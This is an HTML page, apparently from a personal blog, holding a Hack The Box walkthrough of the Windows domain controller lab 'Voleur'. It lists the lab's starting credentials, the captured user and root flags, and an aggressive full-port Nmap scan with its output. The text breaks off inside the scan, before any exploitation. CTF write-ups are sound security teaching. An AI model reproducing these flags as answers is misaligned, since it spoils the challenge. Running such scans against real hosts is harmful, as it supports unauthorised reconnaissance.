<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>[HTB] Voleur - Advanced Windows Exploitation :: HexHunter404</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="HTB Voleur machine walkthrough - Advanced Windows exploitation" />
<meta name="keywords" content="[penetration-testing cybersecurity htb tryhackme ctf ethical-hacking]" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://dhiaznaidi.github.io/writeups/htb/machines/voleur/voleur/" />





  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="https://dhiaznaidi.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="https://dhiaznaidi.github.io/favicon.png">
<link rel="apple-touch-icon" href="https://dhiaznaidi.github.io/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="[HTB] Voleur - Advanced Windows Exploitation">
<meta property="og:description" content="HTB Voleur machine walkthrough - Advanced Windows exploitation" />
<meta property="og:url" content="https://dhiaznaidi.github.io/writeups/htb/machines/voleur/voleur/" />
<meta property="og:site_name" content="HexHunter404" />

  <meta property="og:image" content="https://dhiaznaidi.github.io/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">

  <meta property="article:section" content="writeups" />


  <meta property="article:published_time" content="2024-12-01 10:00:00 &#43;0100 PM" />












</head>
<body>


<div class="container">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://dhiaznaidi.github.io/">
  <div class="logo">
    Terminal
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/writeups/">writeups/</a></li>
        
      
        
          <li><a href="/writeups/htb/">htb/</a></li>
        
      
        
          <li><a href="/research/">research/</a></li>
        
      
        
          <li><a href="/about/">about.txt</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/writeups/" >writeups/</a></li>
        
      
        
          <li><a href="/writeups/htb/" >htb/</a></li>
        
      
        
          <li><a href="/research/" >research/</a></li>
        
      
        
          <li><a href="/about/" >about.txt</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://dhiaznaidi.github.io/writeups/htb/machines/voleur/voleur/">[HTB] Voleur - Advanced Windows Exploitation</a>
  </h1>
  <div class="post-meta"><time class="post-date">2024-12-01</time></div>

  
    <span class="post-tags">
      
      #<a href="https://dhiaznaidi.github.io/tags/htb/">htb</a>&nbsp;
      
      #<a href="https://dhiaznaidi.github.io/tags/windows/">windows</a>&nbsp;
      
      #<a href="https://dhiaznaidi.github.io/tags/hard/">hard</a>&nbsp;
      
      #<a href="https://dhiaznaidi.github.io/tags/active-directory/">active-directory</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <h2 id="machine-information"><strong>Machine Information</strong><a href="#machine-information" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li><strong>OS:</strong> Windows Server 2022 (Domain Controller)</li>
<li><strong>Difficulty:</strong> Medium</li>
<li><strong>Initial Credentials:</strong> ryan.naylor:HollowOct31Nyt</li>
<li><strong>Domain:</strong> voleur.htb</li>
</ul>
<h2 id="flags-obtained"><strong>Flags Obtained</strong><a href="#flags-obtained" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<ul>
<li><strong>User Flag:</strong> 9ead16ec422a36bbec3e8eb539ea2d77</li>
<li><strong>Root Flag:</strong> 092ea0c8c50e977873d72cf015ba61d2</li>
</ul>
<hr>
<h2 id="phase-1-reconnaissance"><strong>Phase 1: Reconnaissance</strong><a href="#phase-1-reconnaissance" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p><strong>1.1 Nmap Scan</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.95 scan initiated Sat Jul  5 21:39:01 2025 as: /usr/lib/nmap/nmap -sV -sC -A -Pn -n -T4 -p- -vvv -oA voleur_scan --disable-arp-ping --min-rate=1000 10.129.196.199</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.196.199
</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2025-07-05 21:39:02 CEST <span style="color:#66d9ef">for</span> 233s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65514</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       REASON          VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        syn-ack ttl <span style="color:#ae81ff">127</span> Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-07-06 03:41:40Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: voleur.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds? syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?     syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped    syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>2222/tcp  open  ssh           syn-ack ttl <span style="color:#ae81ff">127</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: voleur.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped    syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>5985/tcp  open  http          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        syn-ack ttl <span style="color:#ae81ff">127</span> .NET Message Framing
</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49670/tcp open  ncacn_http    syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49671/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
</span></span><span style="display:flex;"><span>52010/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
</span></span><span style="display:flex;"><span>52016/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
</span></span><span style="display:flex;"><span>52036/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: general purpose
</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2022|2012|<span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
</span></span><span style="display:flex;"><span>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>TCP/IP fingerprint:
</span></span><span style="display:flex;"><span>SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.95%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>7/5%OT<span style="color:#f92672">=</span>53%CT<span style="color:#f92672">=</span>%CU<span style="color:#f92672">=</span>%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>T%G<span style="color:#f92672">=</span>N%TM<span style="color:#f92672">=</span>6869803F%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>101%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>108%TI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>106%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>104%TI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%SS<span style="color:#f92672">=</span>S%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M552NW8ST11%O2<span style="color:#f92672">=</span>M552NW8ST11%O3<span style="color:#f92672">=</span>M552NW8NNT11%O4<span style="color:#f92672">=</span>M552NW8ST11%O5<span style="color:#f92672">=</span>M552NW8ST11%O6<span style="color:#f92672">=</span>M552ST11<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FFFF%W2<span style="color:#f92672">=</span>FFFF%W3<span style="color:#f92672">=</span>FFFF%W4<span style="color:#f92672">=</span>FFFF%W5<span style="color:#f92672">=</span>FFFF%W6<span style="color:#f92672">=</span>FFDC<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%TG<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>FFFF%O<span style="color:#f92672">=</span>M552NW8NNS%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>
</span></span><span style="display:flex;"><span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%TG<span style="color:#f92672">=</span>80%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>
</span></span><span style="display:flex;"><span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>
